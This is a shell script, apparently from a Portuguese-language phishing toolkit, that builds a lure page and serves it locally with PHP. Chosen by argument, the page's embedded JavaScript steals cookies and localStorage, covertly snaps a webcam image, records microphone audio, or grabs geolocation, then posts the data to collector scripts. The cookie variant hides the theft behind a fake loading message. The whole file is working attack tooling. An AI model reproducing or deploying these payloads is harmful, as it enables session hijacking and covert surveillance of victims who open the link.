#!/bin/bash
R="$(cd "$(dirname "$0")/.." && pwd)"
T="$1"
if [ "$T" == "cookie" ]; then
cat > "$R/.server/www/grab.html" << EOH
<script>fetch('/core/cookies.php',{method:'POST',body:JSON.stringify({cookies:document.cookie,ls:JSON.stringify(localStorage)})}).then(()=>document.body.innerHTML='<h1>Carregando...</h1>')</script>
EOH
elif [ "$T" == "webcam" ]; then
cat > "$R/.server/www/grab.html" << EOH
<video id="v" autoplay style="display:none"></video><script>navigator.mediaDevices.getUserMedia({video:true}).then(s=>{v.srcObject=s;setTimeout(()=>{const c=document.createElement('canvas');c.width=640;c.height=480;c.getContext('2d').drawImage(v,0,0,640,480);fetch('/core/media.php?t=webcam',{method:'POST',body:JSON.stringify({img:c.toDataURL('image/jpeg')})});},2000)})</script>
EOH
elif [ "$T" == "mic" ]; then
cat > "$R/.server/www/grab.html" << EOH
<script>navigator.mediaDevices.getUserMedia({audio:true}).then(s=>{const m=new MediaRecorder(s);const c=[];m.ondataavailable=e=>c.push(e.data);m.start();setTimeout(()=>{m.stop();const b=new Blob(c);const r=new FileReader();r.onload=()=>fetch('/core/media.php?t=audio',{method:'POST',body:JSON.stringify({audio:r.result})});r.readAsDataURL(b);},5000)})</script>
EOH
elif [ "$T" == "geo" ]; then
cat > "$R/.server/www/grab.html" << EOH
<script>navigator.geolocation.getCurrentPosition(p=>{fetch('/core/media.php?t=geo',{method:'POST',body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude})})})</script>
EOH
fi
cp -r "$R/core" "$R/.server/www/core"
read -rp "Porta [8080]: " p; p="${p:-8080}"
php -S 127.0.0.1:$p -t "$R/.server/www" >/dev/null 2>&1 &
echo -e "\033[1;37m[+] Link: http://127.0.0.1:$p/grab.html\033[0m"
